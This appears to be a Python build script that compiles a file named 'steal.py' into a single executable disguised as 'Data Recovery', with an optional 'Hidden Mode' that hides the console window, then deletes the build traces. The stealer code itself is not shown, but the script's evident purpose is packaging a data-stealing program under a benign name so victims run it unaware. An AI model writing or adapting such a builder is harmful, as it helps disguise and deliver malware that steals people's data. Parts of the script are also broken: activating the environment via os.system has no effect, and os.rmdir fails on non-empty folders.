import os

hidden = False
t = input("Enable Hidden Mode? [yes/No]: ").strip().lower()
if t.startswith("y"):
    hidden = True

print("Activating Virtual Enviroment")
os.system("pip install virtualenv")
os.system("virtualenv env")
os.system("env\\Scripts\\activate.bat")

print("Installing Requirements")
os.system("pip install -r requirements.txt")
os.system("pip install pyinstaller")

print("Starting to compile")
compile_cmnd = "pyinstaller steal.py --noconfirm --onefile --name 'Data Recovery' "
compile_cmnd += '--windowed ' if hidden else '--console '
os.system(compile_cmnd)

print("Deactivating Virtual Enviroment")
os.system("deactivate")

print("Removing unwanted files")
os.rmdir("env")
os.rmdir("build")
os.remove("Data Recovery.spec")
